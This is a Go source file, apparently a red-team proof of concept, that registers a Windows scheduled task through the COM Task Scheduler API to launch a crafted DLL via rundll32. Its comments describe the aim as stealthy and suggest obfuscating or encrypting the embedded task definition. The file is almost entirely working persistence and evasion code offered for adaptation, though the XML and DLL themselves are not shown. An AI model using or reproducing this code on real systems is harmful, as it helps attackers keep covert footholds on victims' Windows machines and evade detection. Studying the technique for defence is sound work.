// PoC to create a scheduled task via COM/OLE to use LOLBAS (rundll32) pointing to a crafted DLL, tries to be somewhat stealthy
// Adapt to your needs!
package main

import (
	_ "embed"
	"fmt"
	"os"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"github.com/stavinski/malgo/win32"
)

// embed the registration xml into the binary when compiled, could also do obfuscating/encoding/encrypting

//go:embed register.xml
var td string

func main() {

	if err := ole.CoInitialize(win32.NULL); err != nil {
		fmt.Fprintln(os.Stderr, err)
		return
	}
	defer ole.CoUninitialize()

	unknown, _ := oleutil.CreateObject("Schedule.Service")
	schtask, _ := unknown.QueryInterface(ole.IID_IDispatch)
	defer unknown.Release()
	defer schtask.Release()

	// params: servername, domain, username, pwd
	_, err := oleutil.CallMethod(schtask, "Connect", "", "", "", "")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		return
	}

	root, err := oleutil.CallMethod(schtask, "GetFolder", `\`)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		return
	}

	rootDispatch := root.ToIDispatch()
	defer rootDispatch.Release()

	// tasks, err := oleutil.CallMethod(rootDispatch, "GetTasks", 0)
	// if err != nil {
	// 	fmt.Fprintln(os.Stderr, err)
	// 	return
	// }

	// tasksDispatch := tasks.ToIDispatch()
	// defer tasksDispatch.Release()

	// count := oleutil.MustGetProperty(tasksDispatch, "Count")
	// if count.Val == 0 {
	// 	fmt.Println("[!] No scheduled tasks in root")
	// 	return
	// }

	// oleutil.ForEach(tasksDispatch, func(v *ole.VARIANT) error {
	// 	name := oleutil.MustGetProperty(v.ToIDispatch(), "Name")
	// 	fmt.Printf("[+] %v\n", name.ToString())
	// 	return nil
	// })

	task, err := oleutil.CallMethod(rootDispatch, "RegisterTask", "", td, 2, "", "", 3)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		return
	}
	taskDispatch := task.ToIDispatch()
	defer taskDispatch.Release()
	name := oleutil.MustGetProperty(taskDispatch, "Name")
	fmt.Printf("[+] created new task: %v\n", name.ToString())
}
